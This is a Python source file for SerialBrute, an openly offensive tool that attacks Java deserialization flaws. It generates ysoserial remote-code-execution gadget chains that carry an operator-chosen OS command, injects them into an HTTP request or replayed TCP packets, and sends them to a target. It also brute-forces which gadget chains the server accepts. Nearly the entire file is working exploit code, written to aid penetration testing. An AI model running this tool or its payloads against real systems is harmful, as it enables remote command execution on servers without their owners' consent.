############################################################
# SerialBrute.py
# 
# Java Serialization brute force attack tool. Generates
# RCE gadget chains using ysoserial and injects them into
# a HTTP request or series of TCP packets in order to aid
# in the detection and exploitation of Java
# deserialization vulnerabilities.
# 
############################################################
# 
# Usage:
#	SerialBrute.py -r <file> -c <command> [opts]
#	SerialBrute.py -p <file> -t <host:port> -c <command> [opts]
# Options:
#	-r <file> To specify a file containing a HTTP request to inject payloads into
#	-p <file> To specify a file containing TCP packets to inject payloads into
#	-c <command> The operating system command to attempt to execute
#	-t <host:port> The target for the attack, required with -p, optional with -r
#	-g <gadget> The ysoserial gadget chain to use (if known, defaults to all if not specified)
#	-dg Attempt to detect valid gadget chains by brute forcing with an invalid OS command and observing responses
#	-n Pure kitchen sink mode, don't ask for confirmation of success in between attacks
# Input files:
#	HTTP request input files should contain a single HTTP request with a marker indicating
#	where to inject deserialization payloads. Use PAYLOAD to mark the location where a
#	payload should be inserted, or PAYLOADNOHEADER if the payload should be inserted
#	without the serialization header (0xAC ED 00 05).
#	
#	TCP replay input files should list the minimal set of TCP packets required to achieve
#	object deserialization against the target. Each line of the file should contain one of
#	the following:
#		Hex-ascii encoded bytes of a packet to send to the target (e.g. aced000577020000)
#		The string RECV to indicate that a response packet should be read from the server
#	Insert PAYLOAD anywhere within an outbound packet line, or on a line on its own, to
#	indicate where the payload should be inserted into the packet. Use PAYLOADNOHEADER to
#	insert the payload without the serialization header (0xAC ED 00 05).
#	E.g.
#		aced000577020000
#		RECV
#		RECV
#		PAYLOADNOHEADER
# 
############################################################
# 
# See SrlBrt.py for a cut-down version that contains an
# empty 'deliverPayload' function that can be filled in to
# attack arbitrary applications and protocols.
# 
############################################################
# 
# Written by Nicky Bloor (@NickstaDB)
# 
############################################################
import os
import socket
import subprocess
import sys
import urllib

####################
# Configuration
####################
#Timeout in seconds for socket receive operations
RECV_TIMEOUT = 1.0

#Amount of data to read in socket receive operations
RECV_SIZE = 4096

#Ysoserial JAR path
YSOSERIAL_PATH = "ysoserial.jar"

#Ysoserial JAR download URL
YSOSERIAL_URL = "https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar"

#All ysoserial RCE gadget chains
ALL_GADGETS = ["BeanShell1", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2",
			   "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
			   "Groovy1", "JavassistWeld1", "JBossInterceptors1", "Jdk7u21", "JSON1", "MozillaRhino1",
			   "ROME", "Spring1", "Spring2"
]

####################
# Default runtime settings
####################
confirmAttacks = True
targetHost = ""
targetPort = -1
inputFile = ""
cmd = ""
gadgetChain = ""
detectGadgets = False
attackmode = ""

####################
# Dispatch a payload via HTTP
####################
def dispatchPayloadViaHttp(payload):
	global targetHost, targetPort, inputFile, RECV_TIMEOUT, RECV_SIZE
	
	#Load the HTTP request from disk
	f = open(inputFile, "rb")
	request = f.read()
	f.close()
	
	#Check for a PAYLOADNOHEADER marker
	if "PAYLOADNOHEADER" in request:
		#Replace the marker with the payload bytes minus the serialization header
		request = request.replace("PAYLOADNOHEADER", payload[4:])
	elif "PAYLOAD" in request:
		#Replace the marker with the payload bytes
		request = request.replace("PAYLOAD", payload)
	else:
		#Missing marker, bail
		print "[-] ERROR: The HTTP request file did not contain the PAYLOAD or PAYLOADNOHEADER marker indicating the location where the payload should be injected."
		sys.exit(1)
	
	#Check for a Content-Length header and fix it if necessary
	headers = request.split("\r\n\r\n")[0]
	if "content-length:" in headers.lower():
		#Re-build the headers with a new content length header
		newHeaders = ""
		for header in headers.split("\r\n"):
			if header.lower().startswith("content-length:"):
				newHeaders = newHeaders + "Content-Length: " + str(len(request.split("\r\n\r\n",1)[1])) + "\r\n"
			else:
				newHeaders = newHeaders + header + "\r\n"
		
		#Re-build the request
		body = request.split("\r\n\r\n", 1)[1]
		request = newHeaders + "\r\n" + body
	
	#Connect to the target
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((targetHost, targetPort))
	
	#Send the payload
	sock.sendall(request)
	
	#Attempt to read the response
	response = ""
	try:
		sock.settimeout(RECV_TIMEOUT)
		response = sock.recv(RECV_SIZE)
	except:
		pass
	
	#Close the connection
	sock.close()
	
	#Return the response (if one was received)
	return response

####################
# Dispatch a payload by replaying TCP packets
####################
def dispatchPayloadViaTcpReplay(payload):
	global targetHost, targetPort, inputFile, RECV_TIMEOUT, RECV_SIZE
	
	#Open the input file
	f = open(inputFile, "r")
	
	#Connect to the target
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((targetHost, targetPort))
	
	#Set a recv timeout on the socket
	sock.settimeout(RECV_TIMEOUT)
	
	#Read the file line-by-line and dispatch packets accordingly
	for packet in f:
		#Strip whitespace
		packet = packet.strip()
		
		#Check for PAYLOADNOHEADER marker
		if "PAYLOADNOHEADER" in packet:
			#Replace the marker with the ascii-hex encoded payload (minus the serialization header), then decode the lot and send it to the target
			sock.sendall(
				packet.replace("PAYLOADNOHEADER", payload[4:].encode("hex")).decode("hex")
			)
			
			#Payload sent, break out of this loop
			break
		#Not found, check for PAYLOAD marker
		elif "PAYLOAD" in packet:
			#Replace the marker with the ascii-hex encoded payload, then decode the whole lot and send it to the target
			sock.sendall(
				packet.replace("PAYLOAD", payload.encode("hex")).decode("hex")
			)
			
			#Payload sent, break out of this loop
			break
		#Check if we need to receive a packet...
		elif "RECV" in packet:
			#Receive a packet from the server
			try:
				sock.recv(RECV_SIZE)
			except socket.timeout:
				#Recv timed out
				print "[-] Socket recv timed out."
				sock.close()
				f.close()
				sys.exit(1)
		#Blank line, do nothing...
		elif packet == "":
			continue
		#Not a payload packet, not a receive instruction, hex-decode the packet and send it to the server
		else:
			sock.sendall(
				packet.decode("hex")
			)
	
	#Attempt to receive a response packet
	response = ""
	try:
		response = sock.recv(RECV_SIZE)
	except socket.timeout:
		pass
	
	#Close the connection
	sock.close()
	
	#Close the input file
	f.close()
	
	#Return the response if one was received
	return response

####################
# Launch a payload and attempt to confirm whether the POP chain works or not.
####################
def launchAttack(payload):
	global attackmode
	
	#Dispatch the payload depending on the attack mode and get the response
	response = ""
	if attackmode == "http":
		response = dispatchPayloadViaHttp(payload)
	elif attackmode == "tcpreplay":
		response = dispatchPayloadViaTcpReplay(payload)
	
	#Check for ClassNotFound exceptions in the response
	if "ClassNotFoundException" in response:
		print "  [-] POP gadget chain not supported."
	elif "java.io.IOException: Cannot run program" in response:
		print "  [+] POP gadget chain is supported"
		print "  [-] Requested command is not available"
	else:
		print "  [+] POP gadget chain may be supported."

####################
# Attempt to detect available POP gadget chains by brute forcing with an invalid command string
# 
# A ClassNotFoundException in the response indicates that a class we attempted to deserialize isn't
# present on the server and so that gadget chain cannot be used. A lack of this exception indicates
# that the gadget chain may be usable.
####################
def doGadgetDetection():
	global attackmode, YSOSERIAL_PATH, ALL_GADGETS
	
	#Gadgets to return
	retGadgets = []
	
	#Attempt to detect available gadgets
	for g in ALL_GADGETS:
		with open(os.devnull, "w") as FNULL:
			payload = subprocess.check_output(["java", "-jar", YSOSERIAL_PATH, g, "SerialBruteGadgetDetector"], stderr=FNULL)
		response = ""
		if attackmode == "http":
			response = dispatchPayloadViaHttp(payload)
		elif attackmode == "tcpreplay":
			response = dispatchPayloadViaTcpReplay(payload)
		
		#Check for a lack of ClassNotFoundException in the response
		if "ClassNotFoundException" not in response:
			#Potential gadget chain identified
			retGadgets.append(g)
	
	#Return the list of potential gadgets
	return retGadgets

####################
# Get the gadget chain or chains to use in the attack
# 
# A single gadget may be specified on the command line, in which case use that (provided it's valid).
# The option to detect gadgets may be specified on the command line, in which case attempt to detect valid gadgets and use those.
# In all other cases, or if detection fails, return all gadget chains.
####################
def getGadgetChains():
	global gadgetChain, detectGadgets, ALL_GADGETS
	
	#Gadgets to return
	retGadgets = []
	
	#Check if a single gadget was specified, and if it's valid
	if gadgetChain != "" and gadgetChain in ALL_GADGETS:
		retGadgets.append(gadgetChain)
	else:
		#No single gadget specified, check if detection was requested
		if detectGadgets == True:
			#Attempt to detect available gadgets
			print "Attempting to detect available POP gadget chains..."
			retGadgets = doGadgetDetection()
			
			#If no gadgets were detected, warn and use all
			if len(retGadgets) == 0:
				print "[-] Warning, gadget detection did not identify any valid gadget chains"
				retGadgets = ALL_GADGETS
			else:
				print "[+] " + str(len(retGadgets)) + " potential gadget chains identified"
		else:
			#Use all gadgets
			retGadgets = ALL_GADGETS
	
	#Return the list of gadgets to use
	return retGadgets

####################
# Check for ysoserial and offer to download it to the current directory if not found.
####################
def checkForYsoserial():
	global YSOSERIAL_PATH, YSOSERIAL_URL
	
	#Check if ysoserial exists
	if not os.path.isfile(YSOSERIAL_PATH):
		#Nope, offer to download it
		print "Error: The ysoserial JAR file was not found. Edit this script to point"
		print "       YSOSERIAL_PATH at the correct path, or enter 'y' below to download"
		print "       ysoserial.jar to the configured path (" + YSOSERIAL_PATH + ")."
		if raw_input("Download ysoserial.jar? ").lower() == "y":
			#Download ysoserial
			urllib.urlretrieve(YSOSERIAL_URL, YSOSERIAL_PATH)
		else:
			#Exit, can't operate without ysoserial
			sys.exit(1)

####################
# Parse the target host and port from the input file containing a HTTP request
####################
def parseTargetFromHttpRequest():
	global inputFile, targetHost, targetPort
	
	#Read the file line-by-line looking for the 'Host' header
	f = open(inputFile)
	for line in f:
		if line.lower().startswith("host:"):
			host = line[5:].strip()
			if ":" in host:
				targetHost = host.split(":")[0]
				targetPort = int(host.split(":")[1])
			else:
				targetHost = host
				targetPort = 80
	f.close()

####################
# Print usage message and quit
####################
def printUsageAndQuit(err = ""):
	#Print error message if supplied
	if err != "":
		print err
		print ""
	
	#Print usage details
	print "SerialBrute.py - Java Serialization Attack Tool"
	print ""
	print "Usage:"
	print "  SerialBrute.py -r <file> -c <command> [opts]"
	print "  SerialBrute.py -p <file> -t <host:port> -c <command> [opts]"
	print ""
	print "Options:"
	print "  -r <file> File containing a HTTP request to issue"
	print "  -p <file> File containing TCP packets to replay"
	print "  -c <command> The operating system command to use in the attack"
	print "  -t <host:port> The target for the attack, required with -p, optional with -r"
	print "  -g <gadget> The gadget chain to use (if known, defaults all if not specified)"
	print "  -dg Attempt to detect valid gadget chains"
	print "  -n Don't ask for confirmation of success in between attacks"
	print ""
	print "Input files:"
	print "  HTTP request input files"
	print "    Use PAYLOAD to mark the location where a payload should be inserted"
	print "    Use PAYLOADNOHEADER if the serialization header should be stripped"
	print "  TCP replay input files"
	print "    Each line should contain one of the following:"
	print "      Hex-ascii encoded bytes of a packet to send to the target"
	print "      RECV to indicate that a packet should be read from the server"
	print "    Insert PAYLOAD within an outbound packet line, or on a line on its own, to"
	print "    indicate where the payload should be inserted into the packet."
	print "    Insert PAYLOADNOHEADER within an outbound packet line, or on a line on its"
	print "    own, if the serialization header should be stripped before inserting the"
	print "    payload there."
	print "    E.g."
	print "      aced000577020000"
	print "      RECV"
	print "      RECV"
	print "      PAYLOADNOHEADER"
	print ""
	
	#Exit
	if err != "":
		sys.exit(1)
	else:
		sys.exit(0)

####################
# SerialBrute
####################
#Process command line args
sys.argv = sys.argv[1:]
i = 0
while i < len(sys.argv):
	opt = sys.argv[i]
	if opt.lower() == "-r":		#Filename containing HTTP request
		attackmode = "http"
		inputFile = sys.argv[i + 1]
		parseTargetFromHttpRequest()
		i = i + 1
	elif opt.lower() == "-p":	#Filename containing TCP packets to replay
		attackmode = "tcpreplay"
		inputFile = sys.argv[i + 1]
		i = i + 1
	elif opt.lower() == "-t":	#Target (intended for TCP replay mode, but can override HTTP target)
		targetHost = sys.argv[i + 1].split(":")[0]
		targetPort = int(sys.argv[i + 1].split(":")[1])
		i = i + 1
	elif opt.lower() == "-n":	#Don't ask for confirmation in between attack attempts
		confirmAttacks = False
	elif opt.lower() == "-c":	#The OS command to attempt to execute
		cmd = sys.argv[i + 1]
		i = i + 1
	elif opt.lower() == "-g":	#The gadget chain to use
		gadgetChain = sys.argv[i + 1]
		i = i + 1
	elif opt.lower() == "-dg":	#Attempt to detect available gadget chains
		detectGadgets = True
		i = i + 1
	else:	#Unknown option
		printUsageAndQuit("Error: Unknown option specified (" + opt + ")")
	
	#Increment i to next parameter
	i = i + 1

#Verify that required runtime options have been set
if targetHost == "" or targetPort == -1 or inputFile == "" or cmd == "" or attackmode == "":
	printUsageAndQuit("Error: Invalid missing one or more required options: -r, -p, -t, -c")

#Make sure ysoserial.jar is available, if not offer to download it to the current directory
checkForYsoserial()

#POP gadget chains to generate
gadgetChains = getGadgetChains()

#Attempt to attack the server with each available gadget chain
print "Starting attack..."
for g in gadgetChains:
	print "  Trying POP gadget chain: " + g
	print "  [+] Generating payload..."
	with open(os.devnull, "w") as FNULL:
		payload = subprocess.check_output(["java", "-jar", YSOSERIAL_PATH, g, cmd], stderr=FNULL)
	print "  [+] Payload generated, launching attack..."
	launchAttack(payload)
	if confirmAttacks:
		if raw_input("  Attack successful? (y/n) [n]: ").lower() == "y":
			break
	print ""
